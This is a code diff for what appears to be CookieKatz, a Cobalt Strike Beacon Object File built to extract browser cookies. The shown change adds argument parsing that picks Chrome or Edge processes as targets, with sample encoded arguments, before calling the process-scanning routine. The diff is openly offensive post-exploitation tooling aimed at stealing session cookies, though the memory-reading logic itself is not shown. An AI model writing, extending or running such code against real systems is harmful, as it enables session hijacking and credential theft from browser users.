@@ -18,6 +18,9 @@
 extern "C" {
 #include "beacon.h"
 
+    DFR(MSVCRT, _stricmp);
+#define _stricmp MSVCRT$_stricmp
+
     //This is important!
     void banner() {
         BeaconPrintf(CALLBACK_OUTPUT, " _____             _    _      _   __      _       \n");
@@ -26,13 +29,42 @@ extern "C" {
         BeaconPrintf(CALLBACK_OUTPUT, "| |    / _ \\ / _ \\| |/ / |/ _ \\    \\ / _` | __|_  /\n");
         BeaconPrintf(CALLBACK_OUTPUT, "| \\__/\\ (_) | (_) |   <| |  __/ |\\  \\ (_| | |_ / / \n");
         BeaconPrintf(CALLBACK_OUTPUT, " \\____/\\___/ \\___/|_|\\_\\_|\\___\\_| \\_/\\__,_|\\__/___|\n");
-        BeaconPrintf(CALLBACK_OUTPUT, " By Meckazin                      github.com/Meckazin \n");
+        BeaconPrintf(CALLBACK_OUTPUT, "By Meckazin                       github.com/Meckazin \n");
     };
 
+    //Example inputs:
+    //  edge:   0a000000060000002f6564676500
+    //  chrome: 0c000000080000002f6368726f6d6500
     void go(char* args, int len) {
         banner();
-        BeaconPrintf(CALLBACK_OUTPUT, "CookieKatz!\n");
-        FindAllSuitableProcesses();
+        BeaconPrintf(CALLBACK_OUTPUT, "Kittens love cookies too! >:3\n\n");
+
+        datap parser;
+        BeaconDataParse(&parser, args, len);
+        if (parser.original == 0)
+        {
+            BeaconPrintf(CALLBACK_OUTPUT, "[-] Missing mandatory argument /chrome or /edge!\n");
+            return;
+        }
+
+        LPCSTR targetConfig = BeaconDataExtract(&parser, NULL);
+        LPCWSTR processName;
+        if (_stricmp(targetConfig, "/chrome") == 0)
+        {
+            BeaconPrintf(CALLBACK_OUTPUT, "[*] Targeting Chrome\n");
+            processName = L"chrome.exe";
+        }
+        else if (_stricmp(targetConfig, "/edge") == 0) {
+            BeaconPrintf(CALLBACK_OUTPUT, "[*] Targeting Edge\n");
+            processName = L"msedge.exe";
+        }
+        else
+        {
+            BeaconPrintf(CALLBACK_OUTPUT, "[-] No target type specified! Use /edge or /chrome to specify target!\n");
+            return;
+        }
+
+        FindAllSuitableProcesses(processName);
         BeaconPrintf(CALLBACK_OUTPUT, "[*] Done\n");
     }
 }
